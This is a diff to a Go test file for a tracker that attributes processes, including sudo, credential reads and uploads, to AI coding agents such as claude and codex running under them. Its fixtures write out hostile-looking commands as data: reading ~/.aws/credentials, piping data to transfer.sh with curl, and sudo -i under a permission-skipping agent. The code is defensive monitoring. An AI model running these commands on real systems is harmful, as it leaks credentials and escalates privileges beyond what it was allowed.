@@ -43,9 +43,9 @@ func TestLineageGateIsTheFalsePositiveControl(t *testing.T) {
 	tracker := newTracker(lineageTTL, clock)
 
 	// A developer's own shell running sudo.
-	tracker.ObserveExec(100, InitPID, InitPID, "login", "-zsh")
-	tracker.ObserveExec(101, 100, 100, "zsh", "-zsh")
-	tracker.ObserveExec(102, 101, 101, "sudo", "sudo -i")
+	tracker.ObserveExec(100, InitPID, InitPID, "login", "-zsh", time.Time{})
+	tracker.ObserveExec(101, 100, 100, "zsh", "-zsh", time.Time{})
+	tracker.ObserveExec(102, 101, 101, "sudo", "sudo -i", time.Time{})
 	if _, ok := tracker.Attribute(102); ok {
 		t.Fatal("sudo under a developer shell was attributed to an agent")
 	}
@@ -54,9 +54,9 @@ func TestLineageGateIsTheFalsePositiveControl(t *testing.T) {
 	}
 
 	// The same sudo as a descendant of claude.
-	tracker.ObserveExec(200, InitPID, InitPID, "claude", "claude --dangerously-skip-permissions")
-	tracker.ObserveExec(201, 200, 200, "sh", "sh -c 'sudo -i'")
-	tracker.ObserveExec(202, 201, 201, "sudo", "sudo -i")
+	tracker.ObserveExec(200, InitPID, InitPID, "claude", "claude --dangerously-skip-permissions", time.Time{})
+	tracker.ObserveExec(201, 200, 200, "sh", "sh -c 'sudo -i'", time.Time{})
+	tracker.ObserveExec(202, 201, 201, "sudo", "sudo -i", time.Time{})
 	attribution, ok := tracker.Attribute(202)
 	if !ok {
 		t.Fatal("sudo under claude was not attributed")
@@ -78,8 +78,8 @@ func TestAttributionSurvivesTheChildExiting(t *testing.T) {
 	t.Parallel()
 	clock, advance := fixedClock(time.Unix(1_760_000_000, 0))
 	tracker := newTracker(lineageTTL, clock)
-	tracker.ObserveExec(300, InitPID, InitPID, "claude", "claude")
-	tracker.ObserveExec(301, 300, 300, "cat", "cat /Users/dev/.aws/credentials")
+	tracker.ObserveExec(300, InitPID, InitPID, "claude", "claude", time.Time{})
+	tracker.ObserveExec(301, 300, 300, "cat", "cat /Users/dev/.aws/credentials", time.Time{})
 	tracker.ObserveExit(301)
 
 	if _, ok := tracker.Attribute(301); !ok {
@@ -100,8 +100,8 @@ func TestAgentInsideAGenericInterpreterIsAttributed(t *testing.T) {
 	t.Parallel()
 	clock, _ := fixedClock(time.Unix(1_760_000_000, 0))
 	tracker := newTracker(lineageTTL, clock)
-	tracker.ObserveExec(400, InitPID, InitPID, "python3", "python3 -m langgraph.cli serve")
-	tracker.ObserveExec(401, 400, 400, "curl", "curl -T - https://transfer.sh/x")
+	tracker.ObserveExec(400, InitPID, InitPID, "python3", "python3 -m langgraph.cli serve", time.Time{})
+	tracker.ObserveExec(401, 400, 400, "curl", "curl -T - https://transfer.sh/x", time.Time{})
 
 	attribution, ok := tracker.Attribute(401)
 	if !ok {
@@ -125,7 +125,7 @@ func TestBootPersistentIsDistinguishedFromOrphaned(t *testing.T) {
 	// Deliberately not an AI process: "ollama serve" would match the
 	// provider-SDK command-line pattern and be attributed as an agent in its
 	// own right, which is correct and a different case from this one.
-	tracker.ObserveExec(500, InitPID, InitPID, "cupsd", "/usr/sbin/cupsd -l")
+	tracker.ObserveExec(500, InitPID, InitPID, "cupsd", "/usr/sbin/cupsd -l", time.Time{})
 	if got := tracker.AttributionState(500); got != StateBootPersistent {
 		t.Errorf("AttributionState(launch item) = %q, want %q", got, StateBootPersistent)
 	}
@@ -146,13 +146,13 @@ func TestAForkedAgentIsOneSessionNotMany(t *testing.T) {
 
 	// /tmp/claude is a bash script; every command it runs is first a fork that
 	// still carries the script's own command line.
-	tracker.ObserveExec(700, InitPID, InitPID, "claude", "/bin/bash /tmp/claude")
+	tracker.ObserveExec(700, InitPID, InitPID, "claude", "/bin/bash /tmp/claude", time.Time{})
 	for _, pid := range []int{701, 702, 703} {
-		tracker.ObserveExec(pid, 700, 700, "claude", "/bin/bash /tmp/claude")
+		tracker.ObserveExec(pid, 700, 700, "claude", "/bin/bash /tmp/claude", time.Time{})
 	}
 	// And a grandchild fork, to prove the walk reaches the outermost ancestor
 	// rather than stopping one level up.
-	tracker.ObserveExec(704, 703, 703, "claude", "/bin/bash /tmp/claude")
+	tracker.ObserveExec(704, 703, 703, "claude", "/bin/bash /tmp/claude", time.Time{})
 
 	roots := map[int]bool{}
 	for _, pid := range []int{700, 701, 702, 703, 704} {
@@ -179,8 +179,8 @@ func TestDistinctAgentsKeepDistinctSessions(t *testing.T) {
 	t.Parallel()
 	clock, _ := fixedClock(time.Unix(1_760_000_000, 0))
 	tracker := newTracker(lineageTTL, clock)
-	tracker.ObserveExec(800, InitPID, InitPID, "claude", "claude")
-	tracker.ObserveExec(900, InitPID, InitPID, "claude", "claude")
+	tracker.ObserveExec(800, InitPID, InitPID, "claude", "claude", time.Time{})
+	tracker.ObserveExec(900, InitPID, InitPID, "claude", "claude", time.Time{})
 
 	first, _ := tracker.Attribute(800)
 	second, _ := tracker.Attribute(900)
@@ -196,8 +196,8 @@ func TestANestedDifferentAgentIsNotMergedUpward(t *testing.T) {
 	t.Parallel()
 	clock, _ := fixedClock(time.Unix(1_760_000_000, 0))
 	tracker := newTracker(lineageTTL, clock)
-	tracker.ObserveExec(1000, InitPID, InitPID, "claude", "claude")
-	tracker.ObserveExec(1001, 1000, 1000, "codex", "codex exec")
+	tracker.ObserveExec(1000, InitPID, InitPID, "claude", "claude", time.Time{})
+	tracker.ObserveExec(1001, 1000, 1000, "codex", "codex exec", time.Time{})
 
 	nested, ok := tracker.Attribute(1001)
 	if !ok {
@@ -214,8 +214,8 @@ func TestAncestryWalkTerminatesOnACycle(t *testing.T) {
 	t.Parallel()
 	clock, _ := fixedClock(time.Unix(1_760_000_000, 0))
 	tracker := newTracker(lineageTTL, clock)
-	tracker.ObserveExec(600, 601, 601, "sh", "sh")
-	tracker.ObserveExec(601, 600, 600, "sh", "sh")
+	tracker.ObserveExec(600, 601, 601, "sh", "sh", time.Time{})
+	tracker.ObserveExec(601, 600, 600, "sh", "sh", time.Time{})
 	done := make(chan struct{})
 	go func() {
 		defer close(done)
@@ -415,7 +415,7 @@ func TestRecycledPidLosesTheOldAgentIdentity(t *testing.T) {
 		{
 			name: "the agent wrapper exec'd into a plain shell",
 			reuse: func(tracker *Tracker) {
-				tracker.ObserveExec(200, 1, 1, "sh", "sh -c true")
+				tracker.ObserveExec(200, 1, 1, "sh", "sh -c true", time.Time{})
 			},
 		},
 	} {
@@ -448,9 +448,9 @@ func TestRecycledPidLosesTheOldAgentIdentity(t *testing.T) {
 func TestSameAgentWalkFollowsTheResponsiblePid(t *testing.T) {
 	tracker := NewTracker()
 	// The agent itself.
-	tracker.ObserveExec(300, 1, 1, "claude", "claude")
+	tracker.ObserveExec(300, 1, 1, "claude", "claude", time.Time{})
 	// A same-agent fork that has been reparented away from it.
-	tracker.ObserveExec(301, InitPID, 300, "claude", "claude")
+	tracker.ObserveExec(301, InitPID, 300, "claude", "claude", time.Time{})
 
 	attribution, ok := tracker.Attribute(301)
 	if !ok {
@@ -529,10 +529,10 @@ func TestSessionLeaderResponsiblePIDDoesNotHideTheAgent(t *testing.T) {
 		child         = 77972
 	)
 	tracker := NewTracker()
-	tracker.ObserveExec(sessionLeader, 1, 0, "login", "login -pf dev")
-	tracker.ObserveExec(shell, sessionLeader, sessionLeader, "bash", "-bash")
-	tracker.ObserveExec(agent, shell, sessionLeader, "bash", "/bin/bash /usr/local/bin/claude")
-	tracker.ObserveExec(child, agent, sessionLeader, "curl", "curl -s https://transfer.sh/")
+	tracker.ObserveExec(sessionLeader, 1, 0, "login", "login -pf dev", time.Time{})
+	tracker.ObserveExec(shell, sessionLeader, sessionLeader, "bash", "-bash", time.Time{})
+	tracker.ObserveExec(agent, shell, sessionLeader, "bash", "/bin/bash /usr/local/bin/claude", time.Time{})
+	tracker.ObserveExec(child, agent, sessionLeader, "curl", "curl -s https://transfer.sh/", time.Time{})
 
 	attribution, ok := tracker.Attribute(child)
 	if !ok {
@@ -558,9 +558,9 @@ func TestReparentedShellStillReachesTheAgent(t *testing.T) {
 		orphan  = 900
 	)
 	tracker := NewTracker()
-	tracker.ObserveExec(agent, launchd, 0, "claude", "claude --print")
+	tracker.ObserveExec(agent, launchd, 0, "claude", "claude --print", time.Time{})
 	// Reparented to launchd; only the responsible pid still names the agent.
-	tracker.ObserveExec(orphan, launchd, agent, "curl", "curl -s https://transfer.sh/")
+	tracker.ObserveExec(orphan, launchd, agent, "curl", "curl -s https://transfer.sh/", time.Time{})
 
 	attribution, ok := tracker.Attribute(orphan)
 	if !ok {
